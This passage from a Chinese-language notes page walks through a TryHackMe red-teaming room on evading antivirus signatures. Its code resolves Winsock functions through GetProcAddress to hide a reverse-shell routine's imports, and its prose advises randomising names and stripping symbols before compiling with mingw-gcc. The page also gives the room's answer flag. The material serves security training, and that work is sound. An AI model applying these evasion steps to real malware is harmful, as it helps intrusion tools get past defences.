aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>一旦获得指针，我们可以用新的指针替换所有 API 调用的实例。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mySocket = myWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>完成后，您的结构定义应如下所示的代码片段。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">typedef int(WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef SOCKET(WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef unsigned(WSAAPI* INET_ADDR)(const char *cp);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef u_short(WSAAPI* HTONS)(u_short hostshort);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef int(WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef int(WSAAPI* CLOSESOCKET)(SOCKET s);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">typedef int(WSAAPI* WSACLEANUP)(void);</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>下面的代码片段定义了所有所需的指针地址，对应于上述结构。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">HMODULE hws2_32 = LoadLibraryW(L&quot;ws2_32&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WSASTARTUP myWSAStartup = (WSASTARTUP) GetProcAddress(hws2_32, &quot;WSAStartup&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WSASOCKETA myWSASocketA = (WSASOCKETA) GetProcAddress(hws2_32, &quot;WSASocketA&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">INET_ADDR myinet_addr = (INET_ADDR) GetProcAddress(hws2_32, &quot;inet_addr&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">HTONS myhtons = (HTONS) GetProcAddress(hws2_32, &quot;htons&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WSACONNECT myWSAConnect = (WSACONNECT) GetProcAddress(hws2_32, &quot;WSAConnect&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CLOSESOCKET myclosesocket = (CLOSESOCKET) GetProcAddress(hws2_32, &quot;closesocket&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WSACLEANUP myWSACleanup = (WSACLEANUP) GetProcAddress(hws2_32, &quot;WSACleanup&quot;); </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>请注意，结构定义应位于代码开头的任何函数外部。指针定义应位于 <code>RunShell</code> 函数的顶部。</p><p>我们现在应该按照最佳实践对指针和其他变量名进行随机化。同时，应该去除二进制文件中的符号或其他可识别信息。</p><p>一旦彻底混淆并移除信息，我们可以使用 <code>mingw-gcc</code> 编译二进制文件。</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">x86_64-w64-mingw32-gcc challenge.c -o challenge.exe -lwsock32 -lws2_32 </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></details>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>在管理员桌面上找到的旗帜是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{08FU5C4710N_15 MY_10V3_14N6U463}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion---结论">Conclusion - 结论<a href="#conclusion---结论" class="hash-link" aria-label="Direct link to Conclusion - 结论" title="Direct link to Conclusion - 结论">​</a></h2>
<p>签名规避可以启动准备恶意应用程序的过程，以避开尖端的解决方案和检测措施。</p>
<p>在本房间中，我们介绍了如何识别签名并破解各种类型的签名。</p>
<p>本房间中展示的技术通常是与工具无关的，可以应用于许多使用场景，因为工具和防御措施在不断变化。</p>
<p>此时，您可以开始理解其他更高级的检测措施或分析技术，并继续提升您的进攻工具制作技巧。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/PgUp-code/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Obfuscation Principles - 混淆原则</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">Bypassing UAC - 绕过 UAC</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction---简介" class="table-of-contents__link toc-highlight">Introduction - 简介</a><ul><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li></ul></li><li><a href="#signature-identification---签名识别" class="table-of-contents__link toc-highlight">Signature Identification - 签名识别</a></li><li><a href="#automating-signature-identification---自动化签名识别" class="table-of-contents__link toc-highlight">Automating Signature Identification - 自动化签名识别</a><ul><li><a href="#threatcheck" class="table-of-contents__link toc-highlight">ThreatCheck</a></li><li><a href="#amsitrigger" class="table-of-contents__link toc-highlight">AMSITrigger</a></li></ul></li><li><a href="#static-code-based-signatures---静态代码签名" class="table-of-contents__link toc-highlight">Static Code-Based Signatures - 静态代码签名</a><ul><li><a href="#混淆方法" class="table-of-contents__link toc-highlight">混淆方法</a></li><li><a href="#混淆类" class="table-of-contents__link toc-highlight">混淆类</a></li><li><a href="#对象的拆分与合并" class="table-of-contents__link toc-highlight">对象的拆分与合并</a></li><li><a href="#移除和模糊化可识别信息" class="table-of-contents__link toc-highlight">移除和模糊化可识别信息</a></li></ul></li><li><a href="#static-property-based-signatures---基于静态属性的签名" class="table-of-contents__link toc-highlight">Static Property-Based Signatures - 基于静态属性的签名</a><ul><li><a href="#文件哈希" class="table-of-contents__link toc-highlight">文件哈希</a></li><li><a href="#熵" class="table-of-contents__link toc-highlight">熵</a></li></ul></li><li><a href="#behavioral-signatures---行为签名" class="table-of-contents__link toc-highlight">Behavioral Signatures - 行为签名</a></li><li><a href="#putting-it-all-together---将所有内容整合在一起" class="table-of-contents__link toc-highlight">Putting It All Together - 将所有内容整合在一起</a></li><li><a href="#conclusion---结论" class="table-of-contents__link toc-highlight">Conclusion - 结论</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">No Copyright © 2025 This is just PgDn's Notes, Sorry. Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>